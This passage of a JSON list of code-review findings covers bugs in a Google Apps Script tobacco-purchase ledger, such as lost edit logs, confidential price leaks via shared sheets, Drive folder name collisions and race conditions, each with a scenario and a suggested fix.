+  "scenario": "Aldi pastes 40 corrected BRUTO values into ITEM!G12:G51 in one action. Apps Script fires one edit event for the whole range; e.oldValue is undefined for any multi-cell edit, and getDisplayValue() returns only the top-left cell. LOG records a single line: ITEM!G12:G51 : \"(kosong)\" -> \"41\". The 40 previous weights are gone with no record that they ever existed and no record of 39 of the 40 new ones. The header comment at line 495 promises this function records what a person changed by hand; for every bulk edit — which is how corrections are actually made — it records almost nothing, and silently, since the catch at line 505 swallows everything.",
+  "consequence": "LOST DATA",
+  "likelihood": "tinggi",
+  "fix": "After line 500: if (e.range.getNumRows() * e.range.getNumColumns() > 1) { catat_('edit manual', 'PERINGATAN', nama + '!' + e.range.getA1Notation() + ' : ' + (n) + ' sel diubah sekaligus — nilai lama TIDAK tercatat'); return; } so at least the gap is visible in the ledger.",
+  "_lens": "v2:4db2548cb228d214e9cb745d74454530bbfb97df6cee591f49e7fdd80e7decaa"
+ },
+ {
+  "title": "The pabrik-confidential rule is one un-reset cell, and COMPILE shows the same money to anyone who opens the file",
+  "where": "buatNotaCetak lines 890-893 (E3 set to 'UNTUK AGEN' only when the function is re-run) and lines 925-933 (the masking IFs); buatTampilan lines 669-673 (COMPILE selects TOTAL JUMLAH and DIBAYAR with no JENIS NOTA filter)",
+  "scenario": "Aldi flips NOTA CETAK!E3 to 'UNTUK SAYA' to check his cuan on a nota, then next morning selects a different nota in B3 and prints for MITA. Nothing resets E3 — only a fresh buatNotaCetak run does (line 891) — so the block headed 'NOTA DARI PABRIK — RAHASIA' and the CUAN cell print with real figures. Separately, the masking only ever covers those two formulas: COMPILE lists every JUAL PABRIK nota with TOTAL JUMLAH and DIBAYAR, and RINGKASAN aggregates DIBAYAR per agen, both on ordinary visible tabs in the same file. The moment Aldi shares the spreadsheet link with an agen so she can verify her gulungan in IN-OUT — the reason NOTA CETAK exists — she can click COMPILE and read exactly what Om CK pays.",
+  "consequence": "LEAKED DATA",
+  "likelihood": "sedang",
+  "fix": "Reset E3 in catatEdit (it already fires on every edit): if the edited cell is NOTA CETAK!B3, force E3 back to 'UNTUK AGEN'. And keep pabrik-priced views out of the shared file — Sheets permissions are per-file, so a tab is not a boundary.",
+  "_lens": "v2:4db2548cb228d214e9cb745d74454530bbfb97df6cee591f49e7fdd80e7decaa"
+ },
+ {
+  "title": "IN-OUT's IN/OUT colouring and font formatting are hardcoded to 500 rows, so rejected gulungan stop showing red",
+  "where": "buatTampilan line 691 (r.getRange(3, 9, 500, 1)); tampil_ line 717 (sh.getRange(3, 1, 500, lebar))",
+  "scenario": "IN-OUT is the tab where Aldi spots rejects: column I is IN/OUT, coloured green and red by the two rules built at lines 692-697 over exactly 500 rows. The QUERY at A2 is ordered by NO NOTA then NO (line 678), so as gulungan pass 500 the highlighting covers only the alphabetically earliest nota numbers. Roll 501 onward shows the bare text 'OUT' in the same 11pt grey as everything else. At 3.000 gulungan, five sixths of the sheet is uncoloured, and an OUT roll scanned by eye reads as accepted — so he pays an agen for tobacco the pabrik sent back. The formatting call at line 717 has the same fixed 500.",
+  "consequence": "WRONG DATA",
+  "likelihood": "sedang",
+  "fix": "Replace the literal 500 at lines 691 and 717 with Math.max(ss_().getSheetByName(T_ITEM).getLastRow(), 500) — the value is available in both places.",
+  "_lens": "v2:4db2548cb228d214e9cb745d74454530bbfb97df6cee591f49e7fdd80e7decaa"
+ },
+ {
+  "title": "folder_() resolves Drive folders by name across the whole account, so a second folder of the same name silently swallows every nota",
+  "where": "folder_ lines 480-483 (DriveApp.getFoldersByName(nama), first hit wins, creates one if none); used by cekInbox line 468 and backupMingguan lines 486-493",
+  "scenario": "getFoldersByName searches all of Drive and its iteration order is not specified. If a second folder named Lancelot-Inbox ever exists — Aldi creates one by hand and forgets the original, or someone shares a folder with that name into his Drive — Claude drops JSON into folder A while the 5-minute trigger reads folder B. cekInbox finds no files, returns {masuk:0, gagal:0}, writes nothing to LOG (catat_ only runs per file, line 474), and the inbox looks healthy. Notas accumulate unprocessed with no error anywhere, and the first sign is a season's data missing from RINGKASAN. The same lookup drives backupMingguan, which copies the entire ledger — pabrik prices, cuan, every DIBAYAR — into whatever folder named Lancelot-Backup it finds first, including one shared to him by someone else.",
+  "consequence": "SILENT FAILURE",
+  "likelihood": "sedang",
+  "fix": "Resolve each folder once and cache its ID: PropertiesService.getScriptProperties().getProperty('id_' + nama) || create-and-store, then DriveApp.getFolderById. Add one LOG line per cekInbox run recording how many files were seen, so an empty inbox is distinguishable from a wrong inbox.",
+  "_lens": "v2:4db2548cb228d214e9cb745d74454530bbfb97df6cee591f49e7fdd80e7decaa"
+ },
+ {
+  "title": "A multi-nota JSON that fails halfway leaves half the notas written and sends the whole file to Gagal — and it can never be re-fed",
+  "where": "tulisDariJson_ (450-455) + cekInbox (467-478); tulisNota_ throws at 262, 263, 304, 317",
+  "scenario": "Lancelot drops one file holding 5 notas from a day's photos. Nota 3 has a seri Mita already used, so tulisNota_ throws at line 317. Notas 1 and 2 are ALREADY committed to NOTA and ITEM (writes happen at 322-351, before the loop moves on). cekInbox's catch at 475 moves the entire file to Lancelot-Gagal and counts it as one failure. Aldi opens the file, fixes nota 3's seri, drops it back in — now nota 1 throws 'Nota X sudah ada' at line 263, the file goes to Gagal again, and notas 4 and 5 are never written. He has to hand-split the JSON to recover, which he will not know to do. Same shape in migrasiDataLama (636): if YOHAN throws on a seri clash, MITA is already in, PAK MUL never runs, and the function aborts with a red error naming only YOHAN.",
+  "consequence": "LOST DATA",
+  "likelihood": "tinggi",
+  "fix": "In tulisDariJson_, wrap each nota: on the first throw, keep processing the rest and collect errors; then in cekInbox write the successful notas' numbers plus the failed ones into the LOG/MASALAH row and move the file to Gagal only if NOTHING succeeded. Best is to have tulisDariJson_ return {ok:[...], gagal:[...]} and have cekInbox write a per-nota result, so a re-fed file only skips what already landed.",
+  "_lens": "v2:c175dc103c74a41ced79f892fb5c55ebd89f6e2a0100972bae4b91bd2cd49761"
+ },
+ {
+  "title": "NOTA's totals are frozen snapshots — marking a gulungan OUT by hand never updates the money, and there is no function that recomputes",
+  "where": "tulisNota_ writes TOTAL BRUTO/NETTO/JUMLAH/ONGKOS/DIBAYAR/IN/OUT as plain values (328-351); cekKualitas only compares (984-987); no recompute function exists anywhere in the file",
+  "scenario": "The pabrik rejects 4 gulungan a week after the buy nota was entered. Aldi does the only thing possible: opens ITEM and changes IN to OUT on 4 rows. Nothing recalculates. NOTA still shows OUT=0, the old TOTAL BRUTO, the old TOTAL JUMLAH and the old DIBAYAR. COMPILE, RINGKASAN, DASHBOARD and NOTA CETAK all read those frozen values, so he pays the agen the pre-rejection amount. At 02:00 cekKualitas reports 'TOTAL BRUTO tidak sama' and 'TOTAL JUMLAH tidak sama' as BERAT — with no way to fix it except retyping six totals by hand, every night, until he gets the arithmetic right. Note also that the ITEM row's JUMLAH is not zeroed by the hand edit, so line 970 ('OUT tapi JUMLAH') fires too.",
+  "consequence": "WRONG DATA",
+  "likelihood": "tinggi",
+  "fix": "Add one function hitungUlangNota_(noNota) that rebuilds the 7 total columns from ITEM rows, and call it from cekKualitas (instead of just reporting the mismatch) or from a menu item. It is the same arithmetic already in tulisNota_ lines 272-338 — extract it once and reuse it for both write and repair.",
+  "_lens": "v2:c175dc103c74a41ced79f892fb5c55ebd89f6e2a0100972bae4b91bd2cd49761"
+ },
+ {
+  "title": "The pabrik-secret gate is sticky between notas and fails OPEN on anything that is not exactly \"UNTUK AGEN\"",
+  "where": "buatNotaCetak: E3 default set only at build time (891-893), gates at H12 (925-927) and I8 (930-932)",
+  "scenario": "Aldi sets MODE = UNTUK SAYA to check his cuan on nota MITA-12. Later that day Mita asks for her nota, so he types MITA-14 in B3 and prints. E3 is still UNTUK SAYA — the mode is never reset per nota, only when the whole sheet is rebuilt — so the red 'NOTA DARI PABRIK — RAHASIA' block and the CUAN cell print with the pabrik's per-gulungan HARGA and JUMLAH on the same page. Second path: E3's validation is requireValueInList(..., true) with no setAllowInvalid(false), so a cleared cell, a trailing space, or 'AGEN' all make the IF fail and the secret block renders. The check is written the unsafe way round: blank means SHOW.",
+  "consequence": "LEAKED DATA",
+  "likelihood": "tinggi",
+  "fix": "Invert both formulas to fail closed — IF($E$3=\"UNTUK SAYA\", <secret>, \"\") — so anything unexpected in E3 hides the pabrik side; add .setAllowInvalid(false) on the E3 validation; and hide the H10:L11 headers with the same condition so a printed agen copy carries no red RAHASIA banner at all.",
+  "_lens": "v2:c175dc103c74a41ced79f892fb5c55ebd89f6e2a0100972bae4b91bd2cd49761"
+ },
+ {
+  "title": "angka_() exists to parse Indonesian numbers and is never called — \"57.500\" becomes 57.5 and \"54,5\" becomes 0",
+  "where": "angka_ defined at 81-85, zero call sites; tulisNota_ uses raw Number() at 274-277 (bruto, tara, netto, harga) and 266-267 (nilaiTara, ongkos)",
+  "scenario": "Lancelot transcribes a handwritten nota the way it is written on paper: harga \"57.500\", bruto \"54,5\". Number('57.500') = 57.5, so JUMLAH = netto x 57.5 — a nota worth Rp 3.000.000 is booked as Rp 3.000. Number('54,5') = NaN, and the || 0 at line 274 turns it into bruto 0. The 0-bruto case is caught nightly by line 968, but the thousand-separator case is NOT caught by anything: netto x harga still equals jumlah, so cekKualitas line 972 passes, TOTAL JUMLAH matches, and DASHBOARD shows a season's modal off by three orders of magnitude.",
+  "consequence": "WRONG DATA",
+  "likelihood": "sedang",
+  "fix": "Route every numeric field in tulisNota_ through angka_ (and teach angka_ the comma decimal: strip '.' thousands, convert ',' to '.'). It is already written and tested-by-intent — it just needs to be wired in at lines 266-277.",
+  "_lens": "v2:c175dc103c74a41ced79f892fb5c55ebd89f6e2a0100972bae4b91bd2cd49761"
+ },
+ {
+  "title": "nilaiTara silently defaults to 0.1, and a percent written as \"10%\" collapses the tara to zero",
+  "where": "tulisNota_ line 266 (default 0.1) + hitungTara_ 117-120 (Number(nilai) || 0)",
+  "scenario": "Two ways this bites. (a) Lancelot reports caraTara 'kg' — Mita's flat 1 kg per gulungan — but the photo did not show the number, so nilaiTara is omitted. Line 266 substitutes 0.1, and because cara is 'kg' the tara becomes 0.1 kg per gulungan instead of 1 kg. On a 40-gulungan nota Aldi pays for 36 extra kg. (b) The JSON says nilaiTara: \"10%\". Number('10%') is NaN, hitungTara_ turns it into 0, tara = 0, netto = bruto. On a 185 kg nota at Rp 55.000 that is Rp 1.017.500 overpaid. Neither is catchable by cekKualitas: netto <= bruto holds, netto x harga = jumlah holds, TOTAL BRUTO matches.",
+  "consequence": "WRONG DATA",
+  "likelihood": "sedang",
+  "fix": "Make a missing or unparseable nilaiTara a hard throw in tulisNota_ (so the file lands in Gagal with a readable reason) instead of a silent 0.1, and add a cekKualitas rule comparing each ITEM's TARA against hitungTara_(BRUTO, CARA TARA, NILAI TARA) from its NOTA row.",
+  "_lens": "v2:c175dc103c74a41ced79f892fb5c55ebd89f6e2a0100972bae4b91bd2cd49761"
+ },
+ {
+  "title": "folder_() picks whichever same-named Drive folder it finds first — a second \"Lancelot-Backup\" inside a shared folder puts the whole ledger, pabrik prices included, where an agen can read it",
+  "where": "folder_ (480-483), used by cekInbox (468) and backupMingguan (486-493)",
+  "scenario": "DriveApp.getFoldersByName searches all of Drive, including Shared-with-me and shared drives, and it.next() returns an arbitrary match with no check for a second one. Aldi makes a shared folder so an agen can drop nota photos and names a subfolder 'Lancelot-Inbox'; or someone shares a folder tree that happens to contain 'Lancelot-Backup'. Sunday 01:00, backupMingguan makes a full copy of the spreadsheet — ITEM's per-gulungan HARGA and JUMLAH for JUAL PABRIK notas, every rekening in M_PETANI — into that shared folder. Nobody is told. The mirror failure is quieter: files dropped into the Inbox folder Aldi is looking at are never seen because the script picked the other one, and cekInbox reports {masuk:0, gagal:0} forever.",
+  "consequence": "LEAKED DATA",
+  "likelihood": "sedang",
+  "fix": "Pin the four folders by ID in constants next to SPREADSHEET_ID and fetch with DriveApp.getFolderById. If name lookup must stay, make folder_ throw when it.hasNext() is still true after the first result.",
+  "_lens": "v2:c175dc103c74a41ced79f892fb5c55ebd89f6e2a0100972bae4b91bd2cd49761"
+ },
+ {
+  "title": "An unparseable date silently becomes today, which also defeats the duplicate fingerprint",
+  "where": "tanggal_ line 100-101 (isNaN fallback to new Date()); used at 329, 341, 303, 601, 625",
+  "scenario": "An agen writes 25-07-2026 with dashes, or 25/7 with no year, or the stamp covers the year. The dd/mm/yyyy regex at line 90 misses, the '25 Juli 2026' regex at 92 misses, new Date('25-07-2026') is Invalid, and line 101 returns today. The nota is filed on the day it was scanned, not the day of the deal — so DASHBOARD's 7 HARI / 30 HARI filter and the per-bulan modal-vs-omset chart (794) are wrong. Worse: sidikNota_ (374-381) hashes the date, so if that same blurry nota is photographed and sent again next week it gets a DIFFERENT today, the fingerprint differs, the NOTA KEMBAR guard at 304 does not fire, and the nota is entered twice with two different numbers.",
+  "consequence": "WRONG DATA",
+  "likelihood": "tinggi",
+  "fix": "Make tanggal_ return null on failure and have tulisNota_ throw 'tanggal tidak terbaca' so the file goes to Gagal with a reason, instead of inventing today. Add dd-mm-yyyy and yyyy-mm-dd to the regex list while you are there.",
+  "_lens": "v2:c175dc103c74a41ced79f892fb5c55ebd89f6e2a0100972bae4b91bd2cd49761"
+ },
+ {
+  "title": "Anything in the Inbox that is not a .json file is skipped forever with no record — and \"Inbox\" is exactly where a person puts photos",
+  "where": "cekInbox line 472: if (f.getName().slice(-5).toLowerCase() !== '.json') continue;",
+  "scenario": "Aldi photographs Yohan's nota on his phone and drops the JPGs straight into Lancelot-Inbox, because that is what an inbox is for. Every 5 minutes the trigger lists them, skips them at line 472 with a bare continue — no catat_, no move, no MASALAH entry — and they sit there permanently. He sees files in the Inbox, assumes they are queued, and only discovers three weeks later that none of those notas exist. Same for 'nota.json.txt' or a file Drive named 'nota (1).json ' with a trailing space.",
+  "consequence": "SILENT FAILURE",
+  "likelihood": "tinggi",
+  "fix": "Replace the bare continue with catat_('cekInbox','DIABAIKAN', f.getName() + ' bukan .json') and move the file to Lancelot-Gagal so the Inbox is always empty when the queue is empty.",
+  "_lens": "v2:c175dc103c74a41ced79f892fb5c55ebd89f6e2a0100972bae4b91bd2cd49761"
+ },
+ {
+  "title": "Two agen using the same nota number is a normal Tuesday, and it silently costs Aldi the second nota",
+  "where": "cariNota_ (441-448) called from tulisNota_ line 263; failure surfaced only via catat_ at 475 and lapor_ which is a no-op under a trigger (67)",
+  "scenario": "Mita's nota is numbered 12 on her pad. Yohan's nota is also numbered 12 on his pad. Lancelot submits Yohan's, cariNota_ finds Mita's row, tulisNota_ throws at line 263, cekInbox moves the file to Gagal. Nobody is told: SpreadsheetApp.getUi() throws inside a time trigger and lapor_ swallows it in an empty catch at line 67, and the LOG tab is not something a 14-year-old reads daily. The same silence hides the NOTA KEMBAR false positive at 304 — two genuinely separate small notas from the same agen on the same day with the same weight and price fingerprint identically and the second is rejected.",
+  "consequence": "LOST DATA",
+  "likelihood": "tinggi",
+  "fix": "Key notas on agen + noNota rather than noNota alone in cariNota_, and make every cekInbox failure append a row to MASALAH (not just LOG) so the 02:00 report and the tab he already opens both show it.",
+  "_lens": "v2:c175dc103c74a41ced79f892fb5c55ebd89f6e2a0100972bae4b91bd2cd49761"
+ },
+ {
+  "title": "Nothing locks the writer, so a manual run alongside the 5-minute trigger interleaves row ranges",
+  "where": "tulisNota_ lines 322-325 (awal = shI.getLastRow()+1) and 349-351 (br = shN.getLastRow()+1); no LockService anywhere in the file; matikanOtomatis 523-525 only sees the current user's triggers",
+  "scenario": "Aldi is impatient, opens the editor and runs cekInbox by hand while the time trigger is mid-run. Both enumerate masuk.getFiles(), both read the same shI.getLastRow(), both compute the same starting row, and the second setValues at line 325 overwrites the first run's gulungan — the NOTA row survives with JUMLAH GULUNG 30 while only the last nota's 30 rows exist in ITEM. Also reachable the durable way: ScriptApp.getProjectTriggers() returns only the triggers of the account running it, so if the sheet is ever opened and nyalakanOtomatis run under a second Google account, matikanOtomatis at line 509 does not remove the first account's triggers and two cekInbox jobs run every 5 minutes forever.",
+  "consequence": "LOST DATA",
+  "likelihood": "sedang",
+  "fix": "Wrap the body of cekInbox in LockService.getScriptLock() with tryLock(0) and return immediately if it is held. That closes both the manual-overlap and the double-trigger case with three lines.",
+  "_lens": "v2:c175dc103c74a41ced79f892fb5c55ebd89f6e2a0100972bae4b91bd2cd49761"
+ },
+ {
+  "title": "catatEdit cannot see the most destructive hand edits: deleted rows are not logged at all, and a paste is logged as one cell",
+  "where": "catatEdit (496-506), installed as onEdit at 513",
+  "scenario": "Aldi right-clicks an ITEM row and deletes it — a mis-scanned gulungan, he thinks. onEdit does not fire for row deletion (that is an onChange event), so nothing reaches catatEdit and LOG stays silent. The gulungan is gone with no record of what it held; the only symptom is next night's 'TOTAL BRUTO tidak sama' on the parent nota, with no way to reconstruct the missing bruto. Second gap: when he pastes a block of cells, e.oldValue is undefined for a multi-cell range so line 501 logs '(kosong)' as the old value, and e.range.getDisplayValue() at 502 returns only the top-left cell — one LOG line claiming one cell changed when 200 did. The comment at line 495 promises this records what a person changed by hand; for the two edits that actually lose data it records nothing usable.",
+  "consequence": "LOST DATA",
+  "likelihood": "tinggi",
+  "fix": "Add an installable onChange trigger in nyalakanOtomatis that logs e.changeType (REMOVE_ROW / INSERT_ROW) with the sheet name and row count, and in catatEdit use e.range.getNumRows()*getNumColumns() to log the shape when the edit is multi-cell.",
+  "_lens": "v2:c175dc103c74a41ced79f892fb5c55ebd89f6e2a0100972bae4b91bd2cd49761"
+ },
+ {
+  "title": "cekKualitas reports \"LUNAS tapi tidak ada LINK BUKTI TRANSFER\" precisely when the proof link IS there",
+  "where": "cekKualitas line 991-992 reading LINK BUKTI TRANSFER, which tulisNota_ line 344 writes as =IMAGE(\"...\")",
+  "scenario": "tulisNota_ stores the transfer proof as an IMAGE formula, not a URL. getValues() on a cell holding a rendering =IMAGE() returns an empty string, so String('').trim() is falsy and the RINGAN finding fires on every nota that has a working proof image. If the URL is not publicly readable the cell shows #ERROR!, which is truthy, so the finding does NOT fire — the check is backwards. Every night MASALAH fills with one bogus RINGAN per paid nota. After a week Aldi stops opening MASALAH, and the BERAT findings that matter go unread with it.",
+  "consequence": "SILENT FAILURE",
+  "likelihood": "tinggi",
+  "fix": "Store the raw URL in LINK BUKTI TRANSFER and put the =IMAGE() in a separate display column (or check the cell's formula via getFormulas() instead of getValues() in cekKualitas). Same applies to LINK NOTA at line 343.",
+  "_lens": "v2:c175dc103c74a41ced79f892fb5c55ebd89f6e2a0100972bae4b91bd2cd49761"
+ },
+ {
+  "title": "A duplicated NO NOTA makes cekKualitas blame the wrong nota, and the obvious human fix corrupts a correct row",
+  "where": "cekKualitas line 954-958: daftar[no] is overwritten unconditionally after the ganda report; totals compared at 981-987",
+  "scenario": "Two rows in NOTA share a number (a copied row, or the concurrency race above). Line 957 keeps only the SECOND row's object, so at line 977-978 the gulungan of BOTH notas accumulate into it. The second nota is then reported as 'TOTAL BRUTO tidak sama dengan jumlah gulungan (370)' when its own gulungan sum is 185, and the first nota is never checked at all. Aldi reads MASALAH literally — the whole point of the tab — and edits the second nota's TOTAL BRUTO and TOTAL JUMLAH to the doubled figures to make the finding go away. Now a correct nota is wrong, permanently, and the finding is silenced.",
+  "consequence": "WRONG DATA",
+  "likelihood": "sedang",
+  "fix": "Key daftar on no + row number (or push into an array per number) so each NOTA row is reconciled against only its own ITEM rows, and skip the total checks entirely for numbers flagged as ganda instead of reporting a mismatch that is not real.",
+  "_lens": "v2:c175dc103c74a41ced79f892fb5c55ebd89f6e2a0100972bae4b91bd2cd49761"
+ },
+ {
+  "title": "One stray value low in the ITEM sheet floods MASALAH with a thousand BERAT findings",
+  "where": "cekKualitas line 946 (getLastRow) and 962 ('gulungan tanpa NO NOTA')",
+  "scenario": "Aldi types a reminder in ITEM row 1800, then clears the text with Delete rather than deleting the row — Sheets keeps getLastRow at 1800. cekKualitas now iterates every blank row between the real data and row 1800 and emits one BERAT 'gulungan tanpa NO NOTA' per row. MASALAH opens with ~1500 red rows, all identical and all meaningless, and the real BERAT findings are buried below them. The MASALAH tab, which is the only channel this system has for telling him something is wrong, becomes unreadable in one afternoon.",
+  "consequence": "SILENT FAILURE",
+  "likelihood": "sedang",
+  "fix": "In the item loop, skip rows where the whole row is blank (r.every(cell => cell === '')) and only report 'gulungan tanpa NO NOTA' when other fields are populated; optionally cap the same finding text at 10 occurrences with a summary line.",
+  "_lens": "v2:c175dc103c74a41ced79f892fb5c55ebd89f6e2a0100972bae4b91bd2cd49761"
+ },
+ {
+  "title": "KOREKSI is write-only — a correction is recorded and then never applied, never surfaced, never checked",
+  "where": "koreksiNota (458-463); the T_KOREKSI sheet is read by nothing in the file",
+  "scenario": "Aldi follows the documented doctrine at line 457 — do not edit a mistake away, write a correction — and logs 'MITA-12, TOTAL BRUTO tertulis 45, seharusnya 54'. The row lands in KOREKSI and stops there. NOTA still says 45, so COMPILE, RINGKASAN, DASHBOARD and the amount he pays Mita all keep using 45 forever, cekKualitas never mentions the outstanding correction, and MASALAH stays green. He believes he has handled it because the system told him that is how you handle it.",
+  "consequence": "WRONG DATA",
+  "likelihood": "sedang",
+  "fix": "Have cekKualitas read KOREKSI and emit one BERAT per correction whose nota still shows the old value (or add a SUDAH DIPERBAIKI column and report every un-ticked row), so an unapplied correction cannot sit invisible.",
+  "_lens": "v2:c175dc103c74a41ced79f892fb5c55ebd89f6e2a0100972bae4b91bd2cd49761"
+ },
+ {
+  "title": "A subtotal row labelled \"TOTAL\" in a hand-made tab migrates as a phantom gulungan weighing the whole pile — and the tara is then never deducted",
+  "where": "migrasiLama_ line 579 (subtotal detected only by an EMPTY NO cell) and 597 (taraPer = tTara/item.length)",
+  "scenario": "The subtotal test is 'no === \"\" || no === null'. A hand-made tab that writes TOTAL, JUMLAH or a dash in the NO column of its last row fails that test, so line 590 pushes it as a real item with bruto = the pile total (say 185 kg) at the carried-forward harga. Because the branch was never taken, tTara stays 0, so taraPer is 0 at line 597 and EVERY migrated gulungan gets netto = bruto with no tara at all. The nota lands with roughly double the true weight and about Rp 10.000.000 of invented money. cekKualitas cannot see it: bruto > 0, netto <= bruto, netto x harga = jumlah, and TOTAL BRUTO equals the sum of the items because tulisNota_ computed both from the same bad list. The CATATAN written at 603 says 'total asli: bruto 0, netto 0, tara 0' — the only clue, in free text nobody reads.",
+  "consequence": "WRONG DATA",
+  "likelihood": "sedang",
+  "fix": "Treat a row as a subtotal when NO is empty OR non-numeric, and make migrasiLama_ throw when tTara is 0 while the tab clearly has a TARA column — a migration that silently drops the tara should refuse to run rather than write.",
+  "_lens": "v2:c175dc103c74a41ced79f892fb5c55ebd89f6e2a0100972bae4b91bd2cd49761"
+ },
+ {
+  "title": "Notas past row 400 and gulungan past row 3000 land in rows with no number format, no dropdown and no colour",
+  "where": "pasangSheet sizes to 401/3001 (139, 155) and applies fmt_/pilih_/warnaKolom_ only to that block; tulisNota_ inserts more rows at 324 and 350 without re-applying anything",
+  "scenario": "At roughly 30 gulungan per nota, ITEM passes row 3001 after about 100 notas — one season. From there insertRowsAfter adds bare rows: BRUTO shows unrounded, money shows as a plain number instead of Rp, IN/OUT loses its dropdown and its red/green. Aldi, now typing into a cell with no dropdown, writes 'out ' with a trailing space; cekKualitas at line 964 compares 'OUT ' to 'OUT', decides the gulungan is IN, and reports 'JUMLAH salah' instead of the real state. The sheet quietly stops helping him exactly when it holds the most money.",
+  "consequence": "WRONG DATA",
+  "likelihood": "sedang",
+  "fix": "After the insertRowsAfter calls in tulisNota_, re-run the fmt_/pilih_ calls for the new range (or simplest: trim the IN/OUT comparison with .trim() in cekKualitas and call a small pasangFormat_(sh) helper whenever rows are added).",
+  "_lens": "v2:c175dc103c74a41ced79f892fb5c55ebd89f6e2a0100972bae4b91bd2cd49761"
+ },
+ {
+  "title": "hapusMigrasi sits in the same function dropdown as the setup steps, takes no confirmation, and takes no backup",
+  "where": "hapusMigrasi (641-653)",
+  "scenario": "The Apps Script function dropdown lists everything alphabetically, so hapusMigrasi sits a few entries from the functions Aldi actually runs. One mis-click deletes every NOTA and ITEM row whose NO NOTA is MITA, YOHAN or PAK MUL — rows deleted outright at line 646, not marked — and then reports 'Selesai' as though that were the intended outcome. The last backup can be six days old (Sunday 01:00, line 512), and because those three notas carry the migrated history there is no other copy. It also matches on NO NOTA text, so any later nota someone numbers 'MITA' goes with them.",
+  "consequence": "LOST DATA",
+  "likelihood": "sedang",
+  "fix": "Call backupMingguan() as the first line of hapusMigrasi, and gate it behind a typed confirmation (a ui.prompt requiring the word HAPUS) so it cannot be triggered by a dropdown slip.",
+  "_lens": "v2:c175dc103c74a41ced79f892fb5c55ebd89f6e2a0100972bae4b91bd2cd49761"
+ },
+ {
+  "title": "Agen and pabrik names are written untrimmed and case-preserved, splitting one agen into several everywhere except the duplicate check",
+  "where": "tulisNota_ lines 332 (d.agen written raw) and 340; contrast sidikNota_ 378 which trims and uppercases",
+  "scenario": "Lancelot reads the name as 'Mita' on one nota, 'MITA' on the next, and Aldi answers 'mita ' with a trailing space to a question on a third. RINGKASAN's QUERY group by AGEN (684) produces three separate agen rows; DASHBOARD's per-agen table (799) does the same; and the dashboard filter n('AGEN')=$B$3 matches only the exact spelling picked from M_AGEN, so choosing MITA shows a fraction of her real totals with no indication anything is missing. The M_AGEN validation is deliberately setAllowInvalid(true) at line 229, so nothing blocks it. Only sidikNota_ normalises, which is why the duplicate check keeps working while every report quietly disagrees with it.",
+  "consequence": "WRONG DATA",
+  "likelihood": "tinggi",
+  "fix": "Normalise once at the boundary: in tulisNota_ write String(d.agen||'').trim().toUpperCase() for AGEN, PABRIK and PETANI (and the same in the item loop at 286), matching what sidikNota_ already does.",
+  "_lens": "v2:c175dc103c74a41ced79f892fb5c55ebd89f6e2a0100972bae4b91bd2cd49761"
+ },
+ {
+  "title": "tambahan changes what Aldi pays but is stored in no column — only inside a free-text CATATAN",
+  "where": "tulisNota_ line 337 (DIBAYAR = jT - oT + tambahan); H_NOTA (31-37) has no TAMBAHAN column; migrasiPakMul_ 626-629 relies on it",
+  "scenario": "The PAK MUL nota pays Rp 200.000 for contoh tembakau on top of the goods. DIBAYAR becomes 9.357.500 while TOTAL JUMLAH stays 9.157.500 and nothing in NOTA explains the gap — the only trace is a sentence in CATATAN. Three months later Aldi reconciles a transfer, sees DIBAYAR does not equal TOTAL JUMLAH minus TOTAL ONGKOS, assumes a typo, and edits DIBAYAR down by 200.000. cekKualitas never checks DIBAYAR against anything (981-995), so the edit is accepted in silence and the payment record no longer matches the bank transfer.",
+  "consequence": "LOST DATA",
+  "likelihood": "rendah",
+  "fix": "Add a TAMBAHAN column to H_NOTA, write d.tambahan into it, and add a cekKualitas rule asserting DIBAYAR = TOTAL JUMLAH - TOTAL ONGKOS + TAMBAHAN so a hand edit to any of the four is caught the same night.",
+  "_lens": "v2:c175dc103c74a41ced79f892fb5c55ebd89f6e2a0100972bae4b91bd2cd49761"
+ },
+ {
+  "title": "Two overlapping runs compute the same append row and one silently overwrites the other",
+  "where": "tulisNota_ lines 322-326 and 349-351 (`var awal = shI.getLastRow() + 1`, `var br = shN.getLastRow() + 1`); cekInbox lines 467-478; no LockService call anywhere in the file",
+  "scenario": "cekInbox fires at 02:00 while cekKualitas (nightly trigger, line 511) is running, or a run started at 10:00 is still writing when the 10:05 trigger fires (Apps Script kills at 6 min, the trigger repeats at 5). Run A reads shI.getLastRow()=500 and starts writing 40 gulungan at row 501. Run B reads getLastRow()=500 before A's setValues lands, and writes its own 12 gulungan at row 501 too. B's 12 rows land on top of A's first 12. A's NOTA row still says JUMLAH GULUNG 40 and TOTAL BRUTO for 40 rolls; 12 of those rolls now belong to a different nota.",
+  "consequence": "LOST DATA",
+  "likelihood": "sedang",
+  "fix": "Wrap the whole body of cekInbox in `var lock = LockService.getScriptLock(); lock.waitLock(30000); try { ... } finally { lock.releaseLock(); }`. Same lock in cekKualitas and migrasiDataLama.",
+  "_lens": "v2:b240527a75ce96603d8a636ab1a75b0b82be22e57ef0fdbc6c84586f5c62c75e"
+ },
+ {
+  "title": "tulisNota_ writes ITEM first and NOTA last, so every duplicate guard is blind to a half-written nota",
+  "where": "tulisNota_: ITEM append lines 322-326, NOTA append lines 349-351; guards at lines 263 (cariNota_), 303 (petaSidik_), 309 (petaSeri_) all read the NOTA tab",
+  "scenario": "cekInbox writes the 30 ITEM rows for nota RA-7, then the execution hits the 6-minute limit (or insertRowsAfter fails) before line 351 writes the NOTA row. The file goes to Lancelot-Gagal (line 475). Aldi drags it back into Lancelot-Inbox. cariNota_('RA-7') returns 0 because the NOTA row was never written, petaSidik_ has no fingerprint for it, and petaSeri_ only clashes on rolls that carry a seri — kunciSeri_ returns '' for blank seri and those are skipped (line 313). All 30 rolls are written a second time; the blank-seri ones are written with no complaint at all.",
+  "consequence": "WRONG DATA",
+  "likelihood": "sedang",
+  "fix": "Write the NOTA row first, then the ITEM rows; or delete the just-written ITEM range in a catch before rethrowing.",
+  "_lens": "v2:b240527a75ce96603d8a636ab1a75b0b82be22e57ef0fdbc6c84586f5c62c75e"
+ },
+ {
+  "title": "A batch JSON is atomic on success but not on failure, and the file can then never be reprocessed",
+  "where": "tulisDariJson_ lines 450-455 (`data.forEach(function (d) { tulisNota_(d); })`); cekInbox lines 473-475",
+  "scenario": "Claude drops one file holding 5 notas. Notas 1 and 2 write fine. Nota 3 throws (bad seri, duplicate fingerprint, anything). forEach stops, the exception propagates, cekInbox moves the file to Lancelot-Gagal and logs only nota 3's message. Notas 4 and 5 were never written and nothing anywhere says so. Aldi fixes nota 3 and re-drops the file: now cariNota_ finds notas 1 and 2 already present and throws 'sudah ada' on the first one, so the file fails forever and notas 4-5 never enter the ledger.",
+  "consequence": "LOST DATA",
